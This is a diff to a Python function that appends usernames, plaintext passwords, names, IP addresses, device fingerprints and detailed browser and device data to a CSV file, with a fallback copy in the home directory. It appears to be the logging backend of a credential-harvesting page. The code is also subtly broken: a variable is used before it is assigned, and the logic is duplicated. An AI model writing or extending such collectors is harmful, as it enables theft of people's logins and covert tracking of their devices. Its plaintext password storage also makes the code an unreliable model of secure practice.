@@ -279,33 +279,78 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
     script_dir = os.path.dirname(os.path.abspath(__file__))
     csv_path = os.path.join(script_dir, 'data.csv')
     
+    # Parse browser info from JSON string to dict
     try:
-        platform_info = json.loads(browser_info)
+        browser_details = json.loads(browser_info)
+    except:
+        browser_details = {"full_user_agent": browser_info}
+    
+    try:
+        file_exists = os.path.isfile(csv_path)
         
-        # Get the values from platform_info
-        device_type = platform_info.get('deviceType', 'Unknown')
-        device_brand = platform_info.get('deviceBrand', 'Unknown')
-        os_name = platform_info.get('os_name', 'Unknown')
-        os_version = platform_info.get('os_version', 'Unknown')
-        browser_name = platform_info.get('browser_name', 'Unknown')
-        browser_version = platform_info.get('browser_version', 'Unknown')
-        screen_resolution = platform_info.get('screen_resolution', 'Unknown')
-        timezone = platform_info.get('timezone', 'Unknown')
-        full_user_agent = platform_info.get('full_user_agent', 'Unknown')
-        
-        # Write to CSV with the correct column names
-        with open(csv_path, 'a', newline='') as csvfile:
-            writer = csv.writer(csvfile)
+        with open(csv_path, 'a', newline='\n') as csvfile:
+            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
+
+            """
+            if file does not exist or is empty, it will write header
+            """
+            if not file_exists or os.stat(csv_path).st_size == 0:
+                writer.writerow([
+                    'first_name',
+                    'last_name',
+                    'username',
+                    'password',
+                    'timestamp', 
+                    'ip_address', 
+                    'device_fingerprint', 
+                    'device_type',
+                    'device_brand',
+                    'device_model',
+                    'os_name', 
+                    'os_version', 
+                    'browser_name', 
+                    'browser_version', 
+                    'screen_resolution',
+                    'timezone',
+                    'full_user_agent'
+                ])
+                csvfile.flush()
+
+            # Get platform info values if available
+            platform_info = {}
+            try:
+                platform_cookie = browser_details.get('platform_details', {})
+                if isinstance(platform_cookie, str):
+                    platform_info = json.loads(platform_cookie)
+                else:
+                    platform_info = platform_cookie
+            except:
+                platform_info = {}
+            
+            # Enhanced device detection from platform_info
+            device_type = browser_details.get('deviceType', platform_info.get('deviceType', device_type))
+            device_brand = browser_details.get('deviceBrand', platform_info.get('deviceBrand', 'Unknown'))
+            device_model = browser_details.get('deviceModel', platform_info.get('deviceModel', 'Unknown'))
+            os_name = browser_details.get('os_name', platform_info.get('os_name', browser_details.get('os_name', 'Unknown')))
+            os_version = browser_details.get('os_version', platform_info.get('os_version', browser_details.get('os_version', 'Unknown')))
+            browser_name = browser_details.get('browser_name', platform_info.get('browser_name', browser_details.get('browser_name', 'Unknown')))
+            browser_version = browser_details.get('browser_version', platform_info.get('browser_version', browser_details.get('browser_version', 'Unknown')))
+            screen_resolution = browser_details.get('screen_resolution', platform_info.get('screen_resolution', browser_details.get('screen_resolution', 'Unknown')))
+            timezone = browser_details.get('timezone', platform_info.get('timezone', browser_details.get('timezone', 'Unknown')))
+            full_user_agent = browser_details.get('full_user_agent', platform_info.get('full_user_agent', browser_details.get('full_user_agent', 'Unknown')))
+
+            # append all data with detailed browser info
             writer.writerow([
                 firstname,
                 lastname,
                 username,
                 password,
-                timestamp,
-                ip_address,
-                device_fingerprint,
-                device_type,
-                device_brand,  # New column
+                timestamp, 
+                ip_address, 
+                device_fingerprint, 
+                device_type, 
+                device_brand,
+                device_model,
                 os_name,
                 os_version,
                 browser_name,
@@ -314,9 +359,88 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
                 timezone,
                 full_user_agent
             ])
+            csvfile.flush()
+            
+        # Update the last modified timestamp
+        update_last_modified_timestamp()
             
     except Exception as e:
-        print(f"Error saving data: {str(e)}")
+        """
+        if writing to default location fails, it will go alternative way/append
+        to navigate it's location request.
+        """
+        fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
+        with open(fallback_path, 'a', newline='\n') as csvfile:
+            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
+            
+            if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
+                writer.writerow([
+                    'first_name',
+                    'last_name',
+                    'username',
+                    'password',
+                    'timestamp', 
+                    'ip_address', 
+                    'device_fingerprint', 
+                    'device_type',
+                    'device_brand',
+                    'device_model',
+                    'os_name', 
+                    'os_version', 
+                    'browser_name', 
+                    'browser_version', 
+                    'screen_resolution',
+                    'timezone',
+                    'full_user_agent'
+                ])
+                csvfile.flush()
+            
+            # Get platform info values
+            platform_info = {}
+            try:
+                platform_cookie = browser_details.get('platform_details', {})
+                if isinstance(platform_cookie, str):
+                    platform_info = json.loads(platform_cookie)
+                else:
+                    platform_info = platform_cookie
+            except:
+                platform_info = {}
+            
+            # Enhanced device detection from platform_info
+            device_type = browser_details.get('deviceType', platform_info.get('deviceType', device_type))
+            device_brand = browser_details.get('deviceBrand', platform_info.get('deviceBrand', 'Unknown'))
+            device_model = browser_details.get('deviceModel', platform_info.get('deviceModel', 'Unknown'))
+            os_name = browser_details.get('os_name', platform_info.get('os_name', browser_details.get('os_name', 'Unknown')))
+            os_version = browser_details.get('os_version', platform_info.get('os_version', browser_details.get('os_version', 'Unknown')))
+            browser_name = browser_details.get('browser_name', platform_info.get('browser_name', browser_details.get('browser_name', 'Unknown')))
+            browser_version = browser_details.get('browser_version', platform_info.get('browser_version', browser_details.get('browser_version', 'Unknown')))
+            screen_resolution = browser_details.get('screen_resolution', platform_info.get('screen_resolution', browser_details.get('screen_resolution', 'Unknown')))
+            timezone = browser_details.get('timezone', platform_info.get('timezone', browser_details.get('timezone', 'Unknown')))
+            full_user_agent = browser_details.get('full_user_agent', platform_info.get('full_user_agent', browser_details.get('full_user_agent', 'Unknown')))
+            
+            writer.writerow([
+                firstname,
+                lastname,
+                username,
+                password,
+                timestamp, 
+                ip_address, 
+                device_fingerprint, 
+                device_type,
+                device_brand,
+                device_model,
+                os_name,
+                os_version,
+                browser_name,
+                browser_version,
+                screen_resolution,
+                timezone,
+                full_user_agent
+            ])
+            csvfile.flush()
+            
+        # Update the last modified timestamp (for fallback path)
+        update_last_modified_timestamp(fallback_path)
 
 def update_last_modified_timestamp(csv_path=None):
     """Update the timestamp for when the data was last modified"""
